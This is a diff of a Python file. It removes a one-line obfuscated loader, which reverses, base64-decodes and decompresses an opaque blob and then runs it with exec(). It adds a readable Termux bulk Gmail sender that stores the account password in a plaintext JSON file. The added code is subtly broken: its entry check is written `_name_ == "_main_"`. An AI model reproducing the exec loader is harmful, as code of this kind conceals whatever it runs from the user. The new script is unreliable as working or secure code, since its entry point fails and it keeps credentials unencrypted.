@@ -1,2 +1,339 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import os
+import time
+import sys
+import json
+
+# Color codes - Modified for Termux compatibility
+a="\033[1;30m";r="\033[1;31m";g="\033[1;32m"
+y="\033[1;33m";b="\033[1;34m";p="\033[1;35m"
+c="\033[1;36m";w="\033[1;37m"
+stp="\033[0m"
+
+# Config file path for saving credentials
+CONFIG_FILE = os.path.join(os.path.expanduser("~"), ".email_config.json")
+
+def clear_screen():
+    """Clear terminal screen - Termux compatible"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def line():
+    print(52*f'{g}━{stp}')
+
+def animation(text, delay):
+    """Simple animation that works in Termux"""
+    for i in text:
+        sys.stdout.write(i)
+        sys.stdout.flush()
+        time.sleep(delay)
+
+def check_termux():
+    """Check if running in Termux and setup accordingly"""
+    try:
+        if 'ANDROID_ROOT' in os.environ:
+            print(f"{y}Termux detected! Optimizing for mobile...{stp}")
+            time.sleep(1)
+            return True
+    except:
+        pass
+    return False
+
+def save_credentials(email, password):
+    """Save credentials to config file in home directory"""
+    try:
+        config = {"email": email, "password": password}
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(config, f)
+        # Set file permissions to read/write for owner only
+        if os.name == 'posix':
+            os.chmod(CONFIG_FILE, 0o600)
+        return True
+    except Exception as e:
+        print(f"{r}Failed to save credentials: {str(e)}{stp}")
+        return False
+
+def load_credentials():
+    """Load credentials from config file if exists"""
+    try:
+        if os.path.exists(CONFIG_FILE):
+            with open(CONFIG_FILE, 'r') as f:
+                config = json.load(f)
+            return config.get("email"), config.get("password")
+    except Exception as e:
+        print(f"{y}Could not load saved credentials: {str(e)}{stp}")
+    return None, None
+
+def delete_saved_credentials():
+    """Delete saved credentials file"""
+    try:
+        if os.path.exists(CONFIG_FILE):
+            os.remove(CONFIG_FILE)
+            print(f"{g}Saved credentials deleted successfully!{stp}")
+    except Exception as e:
+        print(f"{r}Failed to delete credentials: {str(e)}{stp}")
+
+#------------LOGO-------------
+logo = f"""
+{p}╔════════════════════════════════════╗
+║     BULK EMAIL SENDER v2.0         ║
+╠════════════════════════════════════╣
+║                                    ║
+║    ██████    ██   ██    ██████     ║
+║   ██         ██   ██    ██   ██    ║  
+║   ██         ███████    ██████     ║  
+║   ██         ██   ██    ██   ██    ║  
+║    ██████ ██ ██   ██ ██ ██████     ║  
+║                                    ║  
+╠════════════════════════════════════╣
+║ {c}Author :{g} Cyber Hunters BD           ║
+║ {c}GitHub :{g} github.com/cyberhuntersbd ║
+║ {c}Termux :{g} Optimized Version        ║
+╚════════════════════════════════════╝{stp}
+"""
+
+#------------LOADING ANIMATION-------------
+def loading_animation(message, duration=1):
+    """Simple loading animation for Termux"""
+    chars = "⣾⣽⣻⢿⡿⣟⣯⣷"
+    for i in range(20):
+        sys.stdout.write(f'\r{y}{message} {chars[i % len(chars)]}{stp}')
+        sys.stdout.flush()
+        time.sleep(duration/20)
+    print()
+
+def test_gmail_connection(sender_email, sender_password):
+    """Test Gmail login credentials before proceeding"""
+    print(f"{c}\n📡 Testing Gmail Connection...{stp}")
+    loading_animation("Connecting", 2)
+    
+    try:
+        # Try to connect and login
+        test_server = smtplib.SMTP("smtp.gmail.com", 587)
+        test_server.starttls()
+        test_server.login(sender_email, sender_password)
+        test_server.quit()
+        print(f"{g}✅ Gmail login successful!{stp}\n")
+        return True
+    except smtplib.SMTPAuthenticationError:
+        print(f"{r}❌ Gmail login failed: Authentication Error{stp}")
+        print(f"{y}  Possible reasons:{stp}")
+        print("  1. Wrong email or password")
+        print("  2. 2-Step Verification is ON - need App Password")
+        print("  3. Less Secure App Access is OFF")
+        return False
+    except Exception as e:
+        print(f"{r}❌ Connection failed: {str(e)}{stp}")
+        return False
+
+def get_credentials():
+    """Get credentials either from saved file or user input"""
+    saved_email, saved_password = load_credentials()
+    
+    if saved_email and saved_password:
+        print(f"{g}📁 Found saved credentials for: {saved_email}{stp}")
+        print(f"{y}Options:{stp}")
+        print("  [1] Use saved credentials")
+        print("  [2] Enter new credentials")
+        print("  [3] Delete saved credentials")
+        
+        choice = input(f"{c}Your choice (1/2/3): {stp}").strip()
+        
+        if choice == '1':
+            if test_gmail_connection(saved_email, saved_password):
+                return saved_email, saved_password
+            else:
+                print(f"{r}Saved credentials are invalid.{stp}")
+                delete_saved_credentials()
+        elif choice == '3':
+            delete_saved_credentials()
+    
+    # Get new credentials
+    print(f"{c}📝 Please enter your Gmail credentials:{stp}")
+    email = input(f"{p}📧 Your Gmail address: {stp}").strip()
+    password = input(f"{p}🔑 Your Gmail password/App password: {stp}").strip()
+    
+    # Test new credentials
+    if test_gmail_connection(email, password):
+        save_choice = input(f"{y}💾 Save credentials for next time? (yes/no): {stp}").lower()
+        if save_choice in ['yes', 'y']:
+            if save_credentials(email, password):
+                print(f"{g}✅ Credentials saved successfully!{stp}")
+        return email, password
+    else:
+        return None, None
+
+def validate_email(email):
+    """Simple email validation"""
+    return '@' in email and '.' in email
+
+def send_bulk_emails():
+    """Main function to send bulk emails"""
+    clear_screen()
+    line()
+    animation(logo, 0.001)
+    line()
+    
+    print(f"{y}ℹ️  Note: You need Gmail App Password or Less Secure Access enabled{stp}\n")
+    
+    # Get credentials with retry
+    max_attempts = 3
+    for attempt in range(max_attempts):
+        sender_email, sender_password = get_credentials()
+        
+        if sender_email and sender_password:
+            break
+        else:
+            if attempt < max_attempts - 1:
+                print(f"{y}⏳ Attempt {attempt + 2} of {max_attempts}{stp}")
+            else:
+                print(f"{r}❌ Too many failed attempts. Exiting...{stp}")
+                return
+    
+    # Number of recipients input
+    while True:
+        try:
+            num_recipients = int(input(f"{g}👥 How many students to send emails? {stp}"))
+            if num_recipients > 0:
+                break
+            else:
+                print(f"{y}Please enter a positive number{stp}")
+        except ValueError:
+            print(f"{y}Please enter a valid number{stp}")
+    
+    # Store recipient information
+    recipients = []
+    print(f"{g}\n📋 Enter information for {num_recipients} students:{stp}")
+    for i in range(num_recipients):
+        print(f"\n{c}─── Student {i+1} ───{stp}")
+        name = input(f"{p}  👤 Name: {stp}").strip()
+        email = input(f"{p}  📧 Gmail: {stp}").strip()
+        
+        # Email validation
+        while not validate_email(email):
+            print(f"{y}  Invalid email format. Try again:{stp}")
+            email = input(f"{p}  📧 Gmail: {stp}").strip()
+            
+        recipients.append({"name": name, "email": email})
+    
+    # Message input
+    print(f"{a}\n📝 Write confirmation message:{stp}")
+    print(f'{y}(Tip: Use "##name##" for student names){stp}')
+    print(f'{y}(Type "DONE" on new line to finish){stp}')
+    
+    message_lines = []
+    while True:
+        line_input = input()
+        if line_input.upper() == "DONE":
+            break
+        if line_input:
+            message_lines.append(line_input)
+    
+    message_template = "\n".join(message_lines)
+    
+    # Email subject
+    subject = input(f"{g}\n📌 Email subject: {stp}").strip()
+    
+    # Preview
+    print(f"{y}\n🔍 Preview (first recipient):{stp}")
+    if recipients:
+        preview_msg = message_template.replace("##name##", recipients[0]["name"])
+        print(f"{c}To: {recipients[0]['name']} ({recipients[0]['email']}){stp}")
+        print(f"{c}Subject: {subject}{stp}")
+        print(f"{c}Message:\n{preview_msg}{stp}")
+    
+    confirm = input(f"{a}\n📤 Send emails to all students? (yes/no): {stp}").lower()
+    if confirm not in ['yes', 'y']:
+        print(f"{r}❌ Cancelled.{stp}")
+        return
+    
+    # Sending emails
+    try:
+        print(f"{c}\n📡 Connecting to Gmail SMTP...{stp}")
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(sender_email, sender_password)
+        
+        print(f"{g}✅ Connected! Sending emails...{stp}\n")
+        successful = 0
+        failed = 0
+        failed_recipients = []
+        
+        for i, recipient in enumerate(recipients, 1):
+            try:
+                msg = MIMEMultipart()
+                msg["From"] = sender_email
+                msg["To"] = recipient["email"]
+                msg["Subject"] = subject
+                
+                personalized_message = message_template.replace("##name##", recipient["name"])
+                msg.attach(MIMEText(personalized_message, "plain"))
+                
+                server.send_message(msg)
+                print(f"{g}✅ [{i}/{num_recipients}] {recipient['name']} - Sent{stp}")
+                successful += 1
+                
+            except Exception as e:
+                print(f"{r}❌ [{i}/{num_recipients}] {recipient['name']} - Failed{stp}")
+                failed += 1
+                failed_recipients.append(f"{recipient['name']} ({recipient['email']}): {str(e)}")
+            
+            # Small delay to avoid rate limiting
+            time.sleep(0.5)
+        
+        # Summary
+        print(f"\n{y}{'═'*40}{stp}")
+        print(f"{c}📊 FINAL SUMMARY{stp}")
+        print(f"{y}{'═'*40}{stp}")
+        print(f"{g}✅ Successful: {successful}{stp}")
+        print(f"{r}❌ Failed: {failed}{stp}")
+        
+        if failed_recipients:
+            print(f"\n{r}Failed Details:{stp}")
+            for f in failed_recipients:
+                print(f"  • {f}")
+        
+        if successful == num_recipients:
+            print(f"\n{g}🎉 ALL EMAILS SENT SUCCESSFULLY!{stp}")
+        
+    except Exception as e:
+        print(f"{r}\n❌ SMTP Connection Failed: {str(e)}{stp}")
+        print(f"{y}\nTroubleshooting:{stp}")
+        print("1. Check internet connection")
+        print("2. Verify Gmail credentials")
+        print("3. Use App Password if 2FA is ON")
+        print("4. Visit: https://myaccount.google.com/lesssecureapps")
+    
+    finally:
+        try:
+            server.quit()
+        except:
+            pass
+
+def main():
+    """Main program loop"""
+    is_termux = check_termux()
+    
+    while True:
+        send_bulk_emails()
+        
+        print(f"\n{c}{'═'*40}{stp}")
+        another = input(f"{y}🔄 Send another batch? (yes/no): {stp}").lower()
+        
+        if another not in ['yes', 'y']:
+            print(f"\n{g}✨ Thank you for using Bulk Email Sender!{stp}")
+            print(f"{c}📱 Optimized for Termux{stp}")
+            print(f"{y}👋 Goodbye!{stp}")
+            break
+
+if _name_ == "_main_":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{y}⚠️  Program interrupted by user{stp}")
+        print(f"{c}Goodbye!{stp}")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n{r}❌ Unexpected error: {str(e)}{stp}")
+        print(f"{y}Please report this issue{stp}")
